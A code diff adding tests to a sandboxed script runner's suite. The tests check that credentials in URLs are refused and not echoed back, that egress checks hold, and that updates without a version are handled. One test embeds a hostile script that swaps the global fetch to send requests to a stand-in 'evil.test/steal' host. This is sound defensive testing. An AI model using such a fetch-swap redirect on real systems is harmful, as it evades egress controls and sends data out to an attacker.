@@ -265,6 +265,43 @@ export default async function run(ctx) {
   assert.deepEqual(sent, []);
 });
 
+/**
+ * A USER NAME IN THE URL REFUSES THE RUN HERE AS IT DOES IN QUICKJS. workerd's `fetch` inside the loaded Worker drops
+ * `me:pw@` before the request reaches `ScriptOutbound` (measured by the checker on September 22nd: the bare URL arrived
+ * with no authorization header and was sent), so the gateway's check on `request.url` could never fire, and the same
+ * script was refused on the self-host and ran clean here. Red against that: `sent` held the declared origin's URL.
+ */
+test('ctx.fetch with a user name or password in the URL is refused and nothing is sent, as on the self-host', async () => {
+  const { answer, sent } = await run(`
+export default async function run(ctx) {
+  try { await ctx.fetch('https://me:pw@api.gold.test/rate'); } catch (e) { ctx.log('caught'); }
+  ctx.write('series.gold', { value: 1 });
+}`);
+  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED', JSON.stringify(answer));
+  assert.match(answer.refused?.why ?? '', /with a user name or password in the URL/);
+  assert.doesNotMatch(answer.refused?.why ?? '', /pw/, 'the refusal repeated the credentials, and a refusal is kept on the run');
+  assert.equal(answer.writes, undefined);
+  assert.deepEqual(sent, []);
+});
+
+/**
+ * AND THE EGRESS CHECK STAYS ON THE URL THAT IS SENT. The URL the sandbox says it asked for is read for the user name
+ * only, because the loaded module that stamps it runs where the script can reach it: a script can replace
+ * `globalThis.fetch` before `ctx.fetch` calls it, keep the run and the stamped URL, and point the request anywhere.
+ */
+test('a script that swaps the global fetch cannot pass another origin off as the declared one it stamped', async () => {
+  const { answer, sent } = await run(`
+const real = globalThis.fetch;
+globalThis.fetch = (url, init) => real('https://evil.test/steal', init);
+export default async function run(ctx) {
+  try { await ctx.fetch('${GOLD}/rate'); } catch (e) { ctx.log('caught'); }
+  ctx.write('series.gold', { value: 1 });
+}`);
+  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED', JSON.stringify(answer));
+  assert.match(answer.refused?.why ?? '', /evil\.test, which is not in its egress/);
+  assert.deepEqual(sent, []);
+});
+
 test('a key the script does not declare is FORBIDDEN and nothing is sent', async () => {
   const { answer, sent } = await run(`
 export default async function run(ctx) {
@@ -307,6 +344,28 @@ export default async function run(ctx) {
 }`);
   assert.equal(answer.refused?.code, 'FORBIDDEN');
   assert.equal(answer.writes, undefined);
+});
+
+/**
+ * AN UPDATE WITH NO VERSION IS A LAST-WRITER UPDATE HERE AS IT IS ON THE SELF-HOST. The prelude sends `NaN` for a missing
+ * version, RPC keeps it, and `checkWrites` asked for a whole number, so `ctx.update(spoken, patch)` was refused as "a
+ * write this host cannot read" before the kernel, which reads a version that is no number as none, ever saw it. That
+ * refusal counted against the script, and the third paused it (`check:script-run-limits`). The answer crosses this
+ * test as JSON, so the `NaN` handed on arrives as `null`.
+ */
+test('an update with no version is handed on as a last-writer update, and one with a version keeps it', async () => {
+  const { answer } = await run(`
+export default async function run(ctx) {
+  ctx.update('GOLD-1', { value: 2 });
+  ctx.update('GOLD-2', { value: 3 }, null);
+  ctx.update('GOLD-3', { value: 4 }, 7);
+}`);
+  assert.equal(answer.refused, undefined, JSON.stringify(answer));
+  assert.deepEqual(answer.writes, [
+    { op: 'update', spoken: 'GOLD-1', patch: { value: 2 }, version: null },
+    { op: 'update', spoken: 'GOLD-2', patch: { value: 3 }, version: null },
+    { op: 'update', spoken: 'GOLD-3', patch: { value: 4 }, version: 7 },
+  ]);
 });
 
 test('a script that throws is refused with code null and keeps its log', async () => {
